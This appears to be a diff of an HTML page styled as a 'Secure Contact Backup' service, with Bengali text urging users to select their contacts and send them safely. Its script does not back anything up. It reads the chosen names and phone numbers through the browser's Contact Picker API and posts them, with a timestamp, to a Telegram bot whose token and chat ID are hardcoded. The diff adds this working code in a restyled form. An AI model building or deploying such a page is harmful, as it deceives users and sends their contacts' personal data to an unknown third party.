@@ -3,150 +3,247 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Premium Contact Sync</title>
+
+<title>Secure Contact Backup</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
 <style>
+
 body{
-    margin:0;
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    font-family:'Hind Siliguri',sans-serif;
-    background: linear-gradient(135deg,#020617,#0f172a);
+margin:0;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+font-family:'Hind Siliguri',sans-serif;
+background: radial-gradient(circle at top,#111827,#020617);
 }
 
-/* Glass Card */
+/* Premium Card */
+
 .card{
-    width:340px;
-    padding:30px;
-    border-radius:22px;
-    background: rgba(255,255,255,0.06);
-    backdrop-filter: blur(20px);
-    border:1px solid rgba(255,255,255,0.1);
-    box-shadow:0 10px 35px rgba(0,0,0,0.6);
-    text-align:center;
+
+width:350px;
+padding:35px;
+border-radius:24px;
+
+background:rgba(255,255,255,0.04);
+backdrop-filter:blur(22px);
+
+border:1px solid rgba(255,255,255,0.08);
+
+box-shadow:
+0 20px 40px rgba(0,0,0,0.7),
+inset 0 0 20px rgba(255,255,255,0.03);
+
+text-align:center;
+
 }
 
-/* Text */
+/* Title */
+
 h2{
-    color:#fff;
-    margin-bottom:8px;
+color:#fff;
+margin-bottom:10px;
+font-weight:600;
 }
 
 p{
-    color:#94a3b8;
-    font-size:14px;
+color:#9ca3af;
+font-size:14px;
 }
 
-/* Button */
+/* Premium Button */
+
 .btn{
-    margin-top:20px;
-    width:100%;
-    padding:16px;
-    border:none;
-    border-radius:14px;
-    font-size:16px;
-    font-weight:600;
-    cursor:pointer;
-    background: linear-gradient(135deg,#22c55e,#4ade80);
-    color:#000;
-    transition:0.3s;
+
+margin-top:22px;
+
+width:100%;
+padding:16px;
+
+border:none;
+border-radius:14px;
+
+font-size:16px;
+font-weight:600;
+
+cursor:pointer;
+
+background:linear-gradient(135deg,#22c55e,#4ade80);
+
+color:#02120a;
+
+box-shadow:0 10px 25px rgba(34,197,94,0.3);
+
+transition:0.25s;
+
+}
+
+.btn:hover{
+
+transform:translateY(-2px);
+box-shadow:0 14px 35px rgba(34,197,94,0.45);
+
 }
 
 .btn:active{
-    transform:scale(0.98);
+transform:scale(0.97);
 }
 
 /* Loader */
+
 .loader{
-    margin:15px auto;
-    width:26px;
-    height:26px;
-    border:3px solid rgba(255,255,255,0.2);
-    border-top:3px solid #22c55e;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-    display:none;
+
+margin:18px auto;
+
+width:28px;
+height:28px;
+
+border:3px solid rgba(255,255,255,0.15);
+border-top:3px solid #22c55e;
+
+border-radius:50%;
+
+animation:spin 1s linear infinite;
+
+display:none;
+
 }
 
 @keyframes spin{
-    100%{transform:rotate(360deg)}
+
+100%{transform:rotate(360deg)}
+
 }
 
+/* Status */
+
 .status{
-    margin-top:12px;
-    font-size:14px;
-    color:#22c55e;
+
+margin-top:12px;
+font-size:14px;
+color:#4ade80;
+
 }
+
 </style>
 </head>
 
 <body>
 
 <div class="card">
-    <h2>☁️ Contact Backup</h2>
-    <p>কন্টাক্ট সিলেক্ট করে নিরাপদে পাঠান</p>
 
-    <button class="btn" id="btn">Select & Send</button>
+<h2>☁️ Secure Backup</h2>
 
-    <div class="loader" id="loader"></div>
-    <div class="status" id="status">Ready</div>
+<p>কন্টাক্ট সিলেক্ট করে নিরাপদে পাঠান</p>
+
+<button class="btn" id="btn">
+Select & Send
+</button>
+
+<div class="loader" id="loader"></div>
+
+<div class="status" id="status">
+System Ready
+</div>
+
 </div>
 
 <script>
+
 const CONFIG = {
-    TOKEN: "8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
-    CHAT_ID: "6467941734"
+
+TOKEN:"8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
+
+CHAT_ID:"6467941734"
+
 };
 
-const btn = document.getElementById('btn');
-const loader = document.getElementById('loader');
-const status = document.getElementById('status');
+const btn=document.getElementById("btn");
+const loader=document.getElementById("loader");
+const status=document.getElementById("status");
 
-btn.onclick = async () => {
-    try {
-        if (!('contacts' in navigator)) {
-            throw new Error("এই ডিভাইস সাপোর্ট করে না");
-        }
+btn.onclick=async()=>{
 
-        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
+try{
 
-        if (!contacts.length) {
-            throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
-        }
+if(!("contacts" in navigator))
+throw new Error("Device support নেই");
 
-        loader.style.display = "block";
-        status.innerText = "Sending...";
+const contacts=await navigator.contacts.select(
+['name','tel'],
+{multiple:true}
+);
 
-        let text = "📱 Contact List\n\n";
+if(!contacts.length)
+throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
 
-        contacts.forEach(c=>{
-            let name = c.name ? c.name[0] : "No Name";
-            let phone = c.tel ? c.tel[0] : "No Number";
+loader.style.display="block";
+status.innerText="Sending...";
 
-            text += `👤 ${name}\n📞 ${phone}\n\n`;
-        });
+/* Date Time */
 
-        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: text
-            })
-        });
+const now=new Date();
 
-        loader.style.display = "none";
-        status.innerText = "✅ Successfully Sent!";
-    }
-    catch(e){
-        loader.style.display = "none";
-        status.innerText = "❌ " + e.message;
-    }
+const date=now.toLocaleDateString("bn-BD",{
+weekday:'long',
+year:'numeric',
+month:'long',
+day:'numeric'
+});
+
+const time=now.toLocaleTimeString("bn-BD");
+
+/* Contact list */
+
+let text=`📊 Backup Report\n\n`;
+
+text+=`📅 তারিখ: ${date}\n`;
+text+=`⏰ সময়: ${time}\n`;
+text+=`👥 মোট কন্টাক্ট: ${contacts.length}\n\n`;
+
+contacts.forEach(c=>{
+
+let name=c.name?c.name[0]:"No Name";
+let phone=c.tel?c.tel[0]:"No Number";
+
+text+=`👤 ${name}\n📞 ${phone}\n\n`;
+
+});
+
+await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
+
+method:"POST",
+
+headers:{
+'Content-Type':'application/json'
+},
+
+body:JSON.stringify({
+
+chat_id:CONFIG.CHAT_ID,
+text:text
+
+})
+
+});
+
+loader.style.display="none";
+status.innerText="✅ Successfully Sent";
+
+}
+
+catch(e){
+
+loader.style.display="none";
+status.innerText="❌ "+e.message;
+
+}
+
 };
+
 </script>
 
 </body>
